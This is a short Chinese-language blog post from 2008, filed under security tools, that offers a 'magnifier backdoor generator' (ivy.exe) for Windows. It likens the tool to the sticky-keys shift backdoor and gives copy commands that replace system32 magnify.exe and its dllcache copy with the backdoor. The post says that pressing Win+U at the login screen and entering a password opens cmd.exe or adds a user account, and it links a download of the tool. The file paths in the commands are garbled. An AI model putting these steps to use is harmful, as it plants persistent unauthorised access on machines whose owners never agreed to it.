---
title: 放大镜后门生成器
description: 夜火：和以前的2000/xp/vista下5次shift的粘滞键利用差不多，感觉这个比人人皆知的shift后门要好上许多。。。感觉，感觉而已~
date: 2008-04-12 10:57:00
category: 安全工具
tags: ['后门', '生成器']
post_id: 448
alias: Magnifying-glass-backdoor-generator
ViewNums: 5790
---

[夜火](/blog/)：和以前的[2000/xp/vista下**5**次**shift**的粘滞键利用](/blog/5shift-sethc)差不多，感觉这个比人人皆知的[shift后门](/blog/5-shift-backdoor-3389)要好上许多。。。感觉，感觉而已~

设本程序为ivy.exe则运行以下命令即可

copy %systemroot%system32magnify.exe %systemroot%system32
agnify.exe
copy ivy.exe %systemroot%system32magnify.exe
copy ivy.exe %systemroot%system32dllcachemagnify.exe

注：win+u，选择放大镜，输入你设定的后门启动密码，可执行cmd.exe和程序自己添加自定义用户（调用API防止cmd.exe被禁用）

![](http://pic.yupoo.com/sunlei/169855529633/kmtspxfr.jpg)

下载地址：[ivy.rar](/blog/download.asp?id=67 "http://201314.free.fr/attachments/200803/ivy.rar")

来源：红狼论坛

